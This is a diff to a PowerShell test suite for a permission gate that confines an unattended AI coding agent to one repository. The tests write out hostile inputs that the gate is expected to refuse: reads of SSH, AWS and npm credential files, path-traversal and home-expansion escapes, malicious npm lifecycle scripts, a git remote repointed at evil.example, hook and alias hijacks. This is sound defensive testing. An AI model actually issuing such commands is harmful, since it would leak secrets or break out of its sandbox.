@@ -277,17 +277,65 @@ Check-Denied  'npm run lint with extra args is refused'        'npm run lint -- 
 Check-Denied  'npm install is refused'                         'npm install left-pad'
 Check-Denied  'npm ci is refused'                              'npm ci'
 Check-Denied  'npm exec is refused'                            'npm exec -- adb devices'
+Check-Denied  'npm pack is refused'                            'npm pack'
+Check-Denied  'npm publish is refused'                         'npm publish'
+Check-Denied  'npm config set is refused'                      'npm config set ignore-scripts false'
+Check-Denied  'npx is refused entirely'                        'npx tsc --noEmit'
 Check-Denied  'npx with package fetch is refused'              'npx --yes expo-doctor@latest'
+Check-Denied  'direct node invocation is refused'              'node --version'
 
-# The pinned-body check: an allowed script name must still resolve to the
-# expected command in package.json.
+# ---------------------------------------------------------------------
+Set-Section '1b. npm execution chain - lifecycle and executable substitution'
+# ---------------------------------------------------------------------
+# A complete fake tree, so every link of the chain package.json -> script body
+# -> installed package -> declared bin -> .bin shim can be tampered with
+# individually and the gate's response observed.
 $probeRepo = Join-Path $Scratch 'pkgprobe'
-New-Item -ItemType Directory -Path $probeRepo -Force | Out-Null
-(@{ scripts = @{ lint = 'eslint .' } } | ConvertTo-Json) | Set-Content (Join-Path $probeRepo 'package.json') -Encoding utf8
+
+function Reset-NpmProbeTree {
+    param([hashtable]$Scripts = $null, [string]$Version = '9.39.5', [string]$BinPath = './bin/eslint.js', [string]$ShimTarget = 'eslint/bin/eslint.js')
+    if (Test-Path $probeRepo) { Remove-Item -LiteralPath $probeRepo -Recurse -Force }
+    New-Item -ItemType Directory -Path (Join-Path $probeRepo 'node_modules\eslint\bin') -Force | Out-Null
+    New-Item -ItemType Directory -Path (Join-Path $probeRepo 'node_modules\.bin') -Force | Out-Null
+    if ($null -eq $Scripts) { $Scripts = @{ lint = 'eslint .' } }
+    (@{ name = 'probe'; scripts = $Scripts } | ConvertTo-Json -Depth 6) |
+        Set-Content (Join-Path $probeRepo 'package.json') -Encoding utf8
+    (@{ name = 'eslint'; version = $Version; bin = @{ eslint = $BinPath } } | ConvertTo-Json -Depth 6) |
+        Set-Content (Join-Path $probeRepo 'node_modules\eslint\package.json') -Encoding utf8
+    $binFile = Join-Path $probeRepo ('node_modules\eslint\' + ($BinPath -replace '^\./', '' -replace '/', '\'))
+    New-Item -ItemType Directory -Path (Split-Path -Parent $binFile) -Force | Out-Null
+    Set-Content -LiteralPath $binFile -Value '// stand-in binary' -Encoding utf8
+    Set-Content -LiteralPath (Join-Path $probeRepo 'node_modules\.bin\eslint.cmd') `
+                -Value "@ECHO off`r`nnode  `"%~dp0\..\$ShimTarget`" %*" -Encoding ascii
+}
+
 $env:COOKING_LAB_REPO_ROOT = $probeRepo
-Check-Allowed 'npm run lint allowed while package.json matches the pin' 'npm run lint'
-(@{ scripts = @{ lint = 'adb devices && eslint .' } } | ConvertTo-Json) | Set-Content (Join-Path $probeRepo 'package.json') -Encoding utf8
-Check-Denied  'npm run lint refused once package.json no longer matches the pin' 'npm run lint'
+
+Reset-NpmProbeTree
+Check-Allowed 'npm run lint allowed while the whole execution chain matches its pins' 'npm run lint'
+
+Reset-NpmProbeTree -Scripts @{ lint = 'adb devices && eslint .' }
+Check-Denied  'refused once the script body no longer matches its pin' 'npm run lint'
+
+Reset-NpmProbeTree -Scripts ([ordered]@{ prelint = 'node evil.js'; lint = 'eslint .' })
+Check-Denied  'refused when a malicious prelint lifecycle script is added' 'npm run lint'
+
+Reset-NpmProbeTree -Scripts ([ordered]@{ lint = 'eslint .'; postlint = 'node evil.js' })
+Check-Denied  'refused when a malicious postlint lifecycle script is added' 'npm run lint'
+
+Reset-NpmProbeTree -Version '9.99.99'
+Check-Denied  'refused when the installed tool version no longer matches its pin' 'npm run lint'
+
+Reset-NpmProbeTree -BinPath './bin/evil.js'
+Check-Denied  'refused when the package declares a substituted binary' 'npm run lint'
+
+Reset-NpmProbeTree -ShimTarget 'evil/bin/evil.js'
+Check-Denied  'refused when the .bin shim is repointed at another executable' 'npm run lint'
+
+Reset-NpmProbeTree
+Remove-Item -LiteralPath (Join-Path $probeRepo 'node_modules\eslint') -Recurse -Force
+Check-Denied  'refused when the pinned tool package is not installed' 'npm run lint'
+
 $env:COOKING_LAB_REPO_ROOT = $RealRepo
 
 # ---------------------------------------------------------------------
@@ -376,6 +424,155 @@ Check -Name 'Write to product source is allowed' `
 Check -Name 'Read of the queue is allowed (read is not mutation)' `
       -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'build-control/queue/NEXT_RUN.json'))) `
       -Detail 'authorised prompts read the queue that activated them'
+Check -Name 'Write to .gitignore is refused' `
+      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path '.gitignore'))) -Detail 'expected a denial'
+Check -Name 'Write to node_modules is refused' `
+      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'node_modules/eslint/bin/eslint.js'))) -Detail 'expected a denial'
+Check -Name 'Write to package.json is refused' `
+      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'package.json'))) -Detail 'expected a denial'
+Check -Name 'Write to package-lock.json is refused' `
+      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'package-lock.json'))) -Detail 'expected a denial'
+
+# ---------------------------------------------------------------------
+Set-Section '3b. Permission gate - secret-bearing paths are denied to READS too'
+# ---------------------------------------------------------------------
+$secretReads = @(
+    @{ n = '.env';                      p = '.env' },
+    @{ n = '.env.production';           p = '.env.production' },
+    @{ n = '.npmrc';                    p = '.npmrc' },
+    @{ n = '.netrc';                    p = '.netrc' },
+    @{ n = '.git-credentials';          p = '.git-credentials' },
+    @{ n = '.ssh private key';          p = '.ssh/id_ed25519' },
+    @{ n = '.aws credentials';          p = '.aws/credentials' },
+    @{ n = '.gnupg keyring';            p = '.gnupg/secring.gpg' },
+    @{ n = 'a release keystore';        p = 'android/app/release.keystore' },
+    @{ n = 'a signing key';             p = 'certs/upload.jks' },
+    @{ n = 'a private key';             p = 'certs/server.pem' },
+    @{ n = 'a certificate';             p = 'certs/client.p12' },
+    @{ n = 'keystore.properties';       p = 'android/keystore.properties' },
+    @{ n = 'secrets.json';              p = 'secrets.json' },
+    @{ n = 'google-services.json';      p = 'android/app/google-services.json' },
+    @{ n = '.git/config';               p = '.git/config' }
+)
+foreach ($s in $secretReads) {
+    foreach ($tool in @('Read', 'Grep', 'Write')) {
+        $key = if ($tool -eq 'Grep') { 'path' } else { 'file_path' }
+        $json = (@{ tool_name = $tool; tool_input = @{ $key = $s.p } } | ConvertTo-Json -Depth 6 -Compress)
+        Check -Name ("$tool is refused on " + $s.n) -Condition ($null -ne (Invoke-Gate $json)) `
+              -Detail "expected a denial for $tool $($s.p)"
+    }
+}
+Check -Name 'Read of ordinary product source is still allowed' `
+      -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'src/screens/HomeScreen.tsx'))) `
+      -Detail 'legitimate inspection must keep working'
+
+# ---------------------------------------------------------------------
+Set-Section '3c. Repository confinement - escape attempts by every route'
+# ---------------------------------------------------------------------
+$escapePaths = @(
+    @{ n = 'Project A';                       p = 'C:/Projects/ProjectA/notes.md' },
+    @{ n = 'another directory under C:/Projects'; p = 'C:/Projects/cooking-lab-cloud-prototype-archive/x.md' },
+    @{ n = 'a user-profile file';               p = 'C:/Users/mikeo/Documents/private.txt' },
+    @{ n = 'a Windows system folder';           p = 'C:/Windows/System32/drivers/etc/hosts' },
+    @{ n = 'a temp folder outside the repo';    p = 'C:/temp/pwned.txt' },
+    @{ n = 'a UNC network path';                p = '//server/share/secret.txt' },
+    @{ n = 'parent traversal';                  p = '../../evil.txt' },
+    @{ n = 'deep parent traversal';             p = 'src/../../../evil.txt' },
+    @{ n = 'home expansion';                    p = '~/.ssh/id_rsa' },
+    @{ n = 'another drive';                     p = 'D:/evil.txt' },
+    @{ n = 'a Windows env expansion';           p = '%USERPROFILE%/evil.txt' }
+)
+foreach ($e in $escapePaths) {
+    foreach ($tool in @('Read', 'Write')) {
+        Check -Name ("$tool is refused on " + $e.n) `
+              -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool $tool -Path $e.p))) `
+              -Detail "expected a denial for $tool $($e.p)"
+    }
+}
+Check -Name 'Glob is refused outside the repository' `
+      -Condition ($null -ne (Invoke-Gate (@{ tool_name = 'Glob'; tool_input = @{ path = 'C:/Projects' } } | ConvertTo-Json -Compress))) `
+      -Detail 'expected a denial'
+Check -Name 'Grep is refused outside the repository' `
+      -Condition ($null -ne (Invoke-Gate (@{ tool_name = 'Grep'; tool_input = @{ path = 'C:/Users/mikeo' } } | ConvertTo-Json -Compress))) `
+      -Detail 'expected a denial'
+Check -Name 'Glob inside the repository is still allowed' `
+      -Condition ($null -eq (Invoke-Gate (@{ tool_name = 'Glob'; tool_input = @{ path = 'src' } } | ConvertTo-Json -Compress))) `
+      -Detail 'legitimate inspection must keep working'
+
+# ---------------------------------------------------------------------
+Set-Section '3d. Bash surface - only bounded git and approved quality commands'
+# ---------------------------------------------------------------------
+Check-Denied 'read Project A via Bash'          'cat C:/Projects/ProjectA/notes.md'
+Check-Denied 'list another C:/Projects directory' 'ls C:/Projects'
+Check-Denied 'read a user profile file'           'cat C:/Users/mikeo/.gitconfig'
+Check-Denied 'create a file outside the repo'     'mkdir C:/temp/evil'
+Check-Denied 'write outside the repo'             'echo pwned > C:/temp/pwned.txt'
+Check-Denied 'traversal via Bash'                 'cat ../../etc/passwd'
+Check-Denied 'absolute path via Bash'             'cat C:/Windows/win.ini'
+Check-Denied 'UNC path via Bash'                  'cat //server/share/x'
+Check-Denied 'home expansion via Bash'            'cat ~/.ssh/id_rsa'
+Check-Denied 'copy a file'                        'cp src/x.ts src/y.ts'
+Check-Denied 'move a file'                        'mv src/x.ts src/y.ts'
+Check-Denied 'delete a file'                      'rm src/x.ts'
+Check-Denied 'create a directory'                 'mkdir newdir'
+Check-Denied 'create a symlink'                   'ln -s C:/Projects/ProjectA link'
+Check-Denied 'create a junction'                  'mklink /J link C:/Projects'
+Check-Denied 'change permissions'                 'chmod 777 src/x.ts'
+Check-Denied 'change working directory'           'cd src'
+Check-Denied 'general file read command'          'cat package.json'
+Check-Denied 'general listing command'            'ls -la'
+Check-Denied 'general search command'             'grep -r secret .'
+Check-Denied 'general stream editor'              'sed -n 1,5p package.json'
+Check-Denied 'hashing utility'                    'sha256sum package.json'
+Check-Denied 'environment inspection'             'printenv'
+Check-Denied 'launching another executable'       'where.exe git'
+Check-Denied 'PowerShell cmdlet'                  'Get-ChildItem C:/Projects'
+Check-Denied 'echo (no general shell at all)'     'echo hello'
+
+# ---------------------------------------------------------------------
+Set-Section '3e. Git command confinement'
+# ---------------------------------------------------------------------
+Check-Denied 'git -C to another repository'    'git -C C:/Projects/ProjectA status'
+Check-Denied 'git -C to a relative path'       'git -C ../other status'
+Check-Denied 'git --git-dir override'          'git --git-dir=other/.git status'
+Check-Denied 'git --work-tree override'        'git --work-tree=other status'
+Check-Denied 'git -c configuration override'   'git -c core.hooksPath=.evil commit -m x'
+Check-Denied 'git --exec-path override'        'git --exec-path=C:/evil status'
+Check-Denied 'git config write'                'git config core.hooksPath .evil'
+Check-Denied 'git config read'                 'git config --get user.email'
+Check-Denied 'git remote change'               'git remote set-url origin https://evil.example'
+Check-Denied 'git hook subcommand'             'git hook run pre-commit'
+Check-Denied 'git branch creation'             'git checkout -b evil'
+Check-Denied 'git rebase'                      'git rebase -i HEAD~3'
+Check-Denied 'git reset --hard'                'git reset --hard HEAD~1'
+Check-Denied 'git clean -fd'                   'git clean -fd'
+Check-Denied 'git tag'                         'git tag v1.0.0'
+Check-Denied 'git push --force'                'git push origin main --force'
+Check-Denied 'git push to another branch'      'git push origin evil'
+Check-Denied 'git push to another remote'      'git push upstream main'
+Check-Denied 'git fetch from another remote'   'git fetch https://evil.example/x.git'
+Check-Denied 'git add outside the repository'  'git add C:/Projects/ProjectA/x'
+Check-Denied 'git add via traversal'           'git add ../../evil'
+Check-Denied 'git commit --amend'              'git commit --amend -m x'
+Check-Denied 'git commit -a'                   'git commit -a -m x'
+Check-Denied 'git commit -F from a file'       'git commit -F message.txt'
+Check-Denied 'git apply a patch'               'git apply evil.patch'
+Check-Denied 'git submodule'                   'git submodule add https://evil.example/x'
+Check-Denied 'git worktree escape'             'git worktree add C:/temp/wt'
+Check-Denied 'git diff --output writes a file' 'git diff --output=evil.txt'
+Check-Denied 'bare git'                        'git'
+Check-Allowed 'git status is allowed'          'git status --porcelain'
+Check-Allowed 'git diff is allowed'            'git diff --cached --name-only'
+Check-Allowed 'git log is allowed'             'git log --oneline -5'
+Check-Allowed 'git show is allowed'            'git show --stat HEAD'
+Check-Allowed 'git rev-parse is allowed'       'git rev-parse --show-toplevel'
+Check-Allowed 'git rev-list is allowed'        'git rev-list --left-right --count origin/main...main'
+Check-Allowed 'git ls-files is allowed'        'git ls-files -- build-control'
+Check-Allowed 'git fetch origin is allowed'    'git fetch origin --prune'
+Check-Allowed 'git add a repo path is allowed' 'git add build-control/reports/X.md'
+Check-Allowed 'git add -A is allowed'          'git add -A'
+Check-Allowed 'git commit -m is allowed'       "git commit -m 'docs: bounded evidence'"
+Check-Allowed 'git push origin main is allowed' 'git push origin main'
 
 # ---------------------------------------------------------------------
 Set-Section '4. Runner library load (scratch seams)'
@@ -402,6 +599,67 @@ $baseline = Get-ClaudeCliProcesses
 $Script:BaselineClaudePids = @()
 if ($null -ne $baseline) { $Script:BaselineClaudePids = @($baseline | ForEach-Object { [int]$_.ProcessId }) }
 Initialize-LocalDirs
+
+# ---------------------------------------------------------------------
+Set-Section '4b. Git hook suppression and alias safety'
+# ---------------------------------------------------------------------
+# A pre-existing local hook is arbitrary code the queue never authorised.
+$hookMarker = Join-Path $WorkRepo 'HOOK_FIRED.txt'
+Set-Content -LiteralPath (Join-Path $WorkRepo '.git\hooks\pre-commit') `
+            -Value @('#!/bin/sh', 'echo fired > HOOK_FIRED.txt', 'exit 0') -Encoding ascii
+
+Set-Content -LiteralPath (Join-Path $WorkRepo 'hookprobe-a.txt') -Value 'a' -Encoding ascii
+Invoke-GitIn $WorkRepo @('add', 'hookprobe-a.txt') | Out-Null
+Invoke-GitIn $WorkRepo @('commit', '-m', 'hook probe without suppression') | Out-Null
+Check -Name 'a pre-existing Git hook does fire without suppression (control case)' `
+      -Condition (Test-Path $hookMarker) -Detail 'the probe hook did not fire, so the next check would prove nothing'
+if (Test-Path $hookMarker) { Remove-Item -LiteralPath $hookMarker -Force }
+
+Set-ChildGitEnvironment
+
+Check -Name 'the runner-controlled hooks directory exists and is empty' `
+      -Condition ((Test-Path $HooksDir) -and (@(Get-ChildItem -LiteralPath $HooksDir -Force).Count -eq 0)) `
+      -Detail "HooksDir=$HooksDir"
+Check -Name 'core.hooksPath is redirected for the child' `
+      -Condition ((Invoke-GitIn $WorkRepo @('config', '--get', 'core.hooksPath')).Text -eq $HooksDir) `
+      -Detail "effective=$((Invoke-GitIn $WorkRepo @('config','--get','core.hooksPath')).Text)"
+
+Set-Content -LiteralPath (Join-Path $WorkRepo 'hookprobe-b.txt') -Value 'b' -Encoding ascii
+Invoke-GitIn $WorkRepo @('add', 'hookprobe-b.txt') | Out-Null
+Invoke-GitIn $WorkRepo @('commit', '-m', 'hook probe with suppression') | Out-Null
+Check -Name 'a pre-existing Git hook does NOT fire for the unattended child' `
+      -Condition (-not (Test-Path $hookMarker)) -Detail 'the hook executed despite suppression'
+
+Check -Name 'no Git configuration file was modified to achieve suppression' `
+      -Condition ([string]::IsNullOrWhiteSpace((Invoke-GitIn $WorkRepo @('config', '--local', '--get', 'core.hooksPath')).Text)) `
+      -Detail 'suppression must come from the process environment, not from written config'
+Check -Name 'the system credential helper is still resolvable (GitHub auth intact)' `
+      -Condition (-not [string]::IsNullOrWhiteSpace((Invoke-GitIn $RealRepo @('config', '--get', 'credential.helper')).Text)) `
+      -Detail 'credential.helper disappeared, which would break pushes'
+
+Remove-Item -LiteralPath (Join-Path $WorkRepo '.git\hooks\pre-commit') -Force
+Invoke-GitIn $WorkRepo @('push', 'origin', 'main') | Out-Null
+
+Set-ChildNpmEnvironment
+Check -Name 'npm lifecycle scripts are disabled for the child' `
+      -Condition ($env:npm_config_ignore_scripts -eq 'true') -Detail "value=$($env:npm_config_ignore_scripts)"
+Check -Name 'npm network fetches are disabled for the child' `
+      -Condition ($env:npm_config_offline -eq 'true') -Detail "value=$($env:npm_config_offline)"
+
+# An alias turns an allowed subcommand into arbitrary code, and the gate would
+# only ever see the allowed word. The runner refuses to launch instead.
+Check -Name 'no shadowing git alias is present in the scratch repository' `
+      -Condition ($null -eq (Test-NoShadowingGitAlias)) -Detail (Test-NoShadowingGitAlias)
+Invoke-GitIn $WorkRepo @('config', '--local', 'alias.status', '!adb devices') | Out-Null
+Check -Name 'an alias shadowing an allowed subcommand is detected' `
+      -Condition ($null -ne (Test-NoShadowingGitAlias)) -Detail 'the shadowing alias was not detected'
+Check -Name 'repository preconditions refuse to launch while the alias exists' `
+      -Condition ($null -ne (Test-RepoPreconditions)) -Detail 'preconditions passed despite a shadowing alias'
+Invoke-GitIn $WorkRepo @('config', '--local', '--unset', 'alias.status') | Out-Null
+Invoke-GitIn $WorkRepo @('config', '--local', 'alias.lg', 'log --oneline') | Out-Null
+Check -Name 'a harmless alias that shadows nothing is tolerated' `
+      -Condition ($null -eq (Test-NoShadowingGitAlias)) -Detail (Test-NoShadowingGitAlias)
+Invoke-GitIn $WorkRepo @('config', '--local', '--unset', 'alias.lg') | Out-Null
 
 # ---------------------------------------------------------------------
 Set-Section '5. Queue schema - strict validation'
